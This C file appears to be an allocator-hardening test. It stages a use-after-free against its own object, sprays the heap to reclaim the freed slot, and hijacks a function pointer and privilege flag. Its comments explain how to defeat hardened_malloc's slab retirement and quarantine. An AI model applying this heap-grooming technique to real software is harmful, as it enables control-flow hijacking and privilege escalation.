#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "attack.h"

/*
 * Attack: use-after-free -> slot reclaim -> type confusion (our own design).
 *
 * This is the project's custom bug: a UAF turned into a real exploit primitive
 * rather than a silent stale read. The idea is that NONE of the three
 * allocators can stop it by design, because the thing it relies on -- handing a
 * freed slot back to a later allocation of the same size -- is exactly what an
 * allocator is *supposed* to do.
 *
 * The scenario:
 *   1. Allocate a "victim" object that owns a function pointer (`action`) and a
 *      privilege flag (`is_admin`), set up as an ordinary, non-privileged user.
 *   2. free() the victim, but keep (illegally) using the dangling pointer.
 *   3. "Spray": repeatedly allocate NEW objects of the *same size* and fill them
 *      with attacker-controlled bytes (is_admin = 1, action = pwned()). Sooner
 *      or later the allocator reuses the victim's exact slot for one of these
 *      sprayed objects.
 *   4. The moment that happens, reading the still-dangling victim pointer sees
 *      the attacker's bytes: the privilege flag has flipped and the function
 *      pointer now points at attacker-chosen code. Calling victim->action()
 *      transfers control.
 *
 * WHY this is undefined behaviour: after free() the victim pointer is dangling;
 * every read/write/call through it is UB. The exploit is that the allocator
 * recycles that memory for a different, attacker-filled object -- "type
 * confusion" between the freed victim and the sprayed replacement.
 *
 * Why each allocator cannot simply stop it:
 *   - glibc: tcache is LIFO, so the *first* same-size malloc returns the victim
 *     slot. Reclaim is instant and deterministic; no check even fires.
 *   - Scudo: placement is randomized and there is an optional quarantine (OFF by
 *     default), so reclaim is not immediate -- but a large enough spray fills in
 *     around the slot and eventually lands on it.
 *   - hardened_malloc: slot selection is randomized and freed slots sit in a
 *     delayed-reuse ring. It also *retires an empty slab* -- if the freed slot
 *     was the only live object in its slab, the whole slab is quarantined and
 *     its address is not handed back, which defeats a naive "free one object and
 *     spray" reclaim outright. The exploit answer, used here, is to PIN the
 *     slab: allocate a batch of neighbour objects and keep them live, then free
 *     the victim from the MIDDLE of them. The slab stays partially used (never
 *     retired), so hardened's randomized reuse must eventually hand the victim's
 *     hole to a sprayed object. Zero-on-free only wipes the *stale* bytes; once
 *     the slot is legitimately reused by a sprayed object, the attacker's bytes
 *     are there by design.
 *
 * So randomization and quarantine raise the *cost* (more spray iterations) but
 * do not prevent reclaim -- that is the finding. The heap "grooming" loop below
 * just keeps allocating until the exact victim slot is reused, which is how real
 * UAF exploits defeat probabilistic hardening.
 *
 * Like uninitialized_read.c, success here is silent (no crash), so this program
 * classifies itself:
 *   - prints ATTACK SUCCEEDED and exits 0 if the victim slot was reclaimed and
 *     the function pointer / flag were hijacked (a MISS -- the bug won), or
 *   - exits 1 with no marker if the slot was never reused within the spray cap
 *     (the allocator's delayed/randomized reuse held for the whole budget), which
 *     the runner records as STOPPED.
 *
 * The security-relevant fields are placed AFTER a 16-byte `name` pad on purpose:
 * free-list allocators scribble their own bookkeeping into the first bytes of a
 * freed chunk (e.g. glibc tcache's next-pointer + key fill bytes 0-15). Keeping
 * is_admin/action past that means a reclaim detection reflects the sprayed
 * object's real bytes, not leftover allocator metadata.
 */

/* The budget. 200k * sizeof(Object) is a few MiB and runs in well under the
 * runner's 10s timeout; it is sized to outlast hardened_malloc's reuse ring. */
#define SPRAY_MAX 200000

/* Neighbour objects kept live around the victim so its slab is never empty and
 * so cannot be retired by hardened_malloc. The victim is freed from the middle
 * of this batch. Spanning several slabs guarantees the victim's slab keeps live
 * tenants. */
#define FILLERS   4096
#define VICTIM_IX (FILLERS / 2)

typedef void (*action_fn)(void);

typedef struct {
    char       name[16]; /* pad past free-list metadata bytes (see above) */
    int        is_admin; /* 0 for the victim; the attack flips it to 1     */
    action_fn  action;   /* hijack target                                  */
} Object;

/* The victim's legitimate handler. */
static void normal_action(void) {
    /* A real, callable address -- the "before" value of action. */
    volatile int sink = 0;
    (void)sink;
}

/* The attacker's handler -- reaching here proves control-flow hijack. */
static volatile int g_pwned = 0;
static void pwned_action(void) {
    g_pwned = 1;
}

/* Free a pointer array, skipping NULL holes (the freed victim, and the unused
 * tail of a spray that stopped early), then free the array itself. Keeps leak
 * checkers quiet; the dangling victim pointer is intentionally left alone. */
static void free_all(Object **arr, int n) {
    if (arr == NULL)
        return;
    for (int i = 0; i < n; i++)
        if (arr[i] != NULL)
            free(arr[i]);
    free(arr);
}

int main(void) {
    ATTACK_BEGIN("uaf_reclaim");

    /* 0. Pin a slab: allocate a batch of neighbour objects and keep them live.
     *    This stops hardened_malloc from retiring the victim's (now partially
     *    used) slab after the free, which is what defeats a lone free + spray. */
    STEP("allocating %d neighbour objects to pin the victim's slab", FILLERS);
    Object **fillers = calloc(FILLERS, sizeof(Object *));
    if (fillers == NULL) {
        perror("calloc failed");
        return 1;
    }
    for (int i = 0; i < FILLERS; i++) {
        fillers[i] = malloc(sizeof(Object));
        if (fillers[i] == NULL) {
            perror("malloc failed (fillers)");
            return 1;
        }
        memset(fillers[i], 0, sizeof(Object));
        strncpy(fillers[i]->name, "filler", sizeof(fillers[i]->name) - 1);
    }

    /* 1. Pick the victim from the MIDDLE of the batch and set it up as a
     *    non-privileged user. */
    Object *victim = fillers[VICTIM_IX];
    memset(victim, 0, sizeof(Object));
    strncpy(victim->name, "user", sizeof(victim->name) - 1);
    victim->is_admin = 0;
    victim->action = normal_action;
    STEP("victim at %p (fillers[%d]): is_admin=%d action=%p (normal_action=%p)",
         (void *)victim, VICTIM_IX, victim->is_admin, (void *)victim->action,
         (void *)normal_action);

    /* 2. Free ONLY the victim but keep the dangling pointer. Its slab neighbours
     *    stay live, so the slab stays in service. */
    STEP("free(victim) -- pointer now dangling; slab still pinned by neighbours");
    fillers[VICTIM_IX] = NULL; /* avoid double-freeing the victim on cleanup */
    free(victim);

    /* 3. Heap grooming: churn same-size allocations until the allocator hands
     *    the victim's slot back to one of them.
     *
     *    Each iteration allocates an object, fills it with attacker bytes, and
     *    checks the dangling victim. The twist for hardened_malloc: its slot
     *    quarantine is drained by *frees* of the same size class, not by
     *    allocations -- so an allocation-only spray (every object kept live)
     *    leaves the victim's slot stuck in quarantine forever. We therefore
     *    FREE every churn object that did NOT reclaim the slot. Those frees
     *    advance the quarantine (eventually evicting the victim's slot back into
     *    the free pool) and keep the heap flat. The check happens BEFORE the
     *    free, so the one object that lands on the victim's slot is caught and
     *    kept live, giving a stable alias.
     *
     *    For glibc the very first malloc returns the victim's slot (tcache LIFO)
     *    and we break immediately; the free-churn path is only exercised by the
     *    randomized/quarantined allocators. */
    STEP("churning same-size allocations to reclaim the freed slot "
         "(cap %d, freeing misses to drain any quarantine)", SPRAY_MAX);

    Object *alias = NULL;   /* the churn object that reclaimed the victim slot */
    int reclaimed_at = -1;
    for (int i = 0; i < SPRAY_MAX; i++) {
        Object *o = malloc(sizeof(Object));
        if (o == NULL) {
            perror("malloc failed during spray");
            break;
        }

        /* Attacker-controlled contents: escalate privilege + redirect the
         * function pointer. */
        memset(o, 0, sizeof(Object));
        strncpy(o->name, "pwned", sizeof(o->name) - 1);
        o->is_admin = 1;
        o->action = pwned_action;

        /* 4. Inspect the still-dangling victim pointer. If this allocation
         *    reused the victim's slot, the victim now reads the attacker's
         *    bytes. Require BOTH the flag and the pointer to match so a stray
         *    zeroed read cannot be mistaken for a hit. */
        if (victim->is_admin == 1 && victim->action == pwned_action) {
            alias = o;          /* keep it live so the alias is stable */
            reclaimed_at = i;
            break;
        }

        free(o);                /* miss: release it to advance the quarantine */
    }

    if (reclaimed_at < 0) {
        STEP("victim slot never reused within %d allocations "
             "(randomized/delayed reuse held for the whole budget)", SPRAY_MAX);
        free_all(fillers, FILLERS);
        return 1; /* no marker -> runner records STOPPED (defense held) */
    }

    STEP("victim slot reclaimed on allocation #%d (alias at %p): dangling read "
         "now sees is_admin=%d action=%p (pwned_action=%p)",
         reclaimed_at, (void *)alias, victim->is_admin, (void *)victim->action,
         (void *)pwned_action);

    /* 5. Drive the hijacked state through the dangling pointer. is_admin has
     *    flipped to 1 and action points at attacker code; calling it transfers
     *    control. This is now aliasing a live sprayed object, so the call is a
     *    real, reachable function -- not a wild jump. */
    STEP("privilege escalated via dangling pointer; invoking hijacked "
         "function pointer");
    victim->action();

    if (victim->is_admin == 1 && g_pwned == 1) {
        STEP("control-flow hijack confirmed (pwned_action ran, is_admin=1)");
        /* Reached only if the UAF reclaim + type confusion fully succeeded. */
        ATTACK_SUCCEEDED();
        free(alias);
        free_all(fillers, FILLERS);
        return 0;
    }

    /* Should not happen given the checks above, but stay honest if it does. */
    STEP("reclaim detected but hijack did not take effect; no success claimed");
    free(alias);
    free_all(fillers, FILLERS);
    return 1;
}
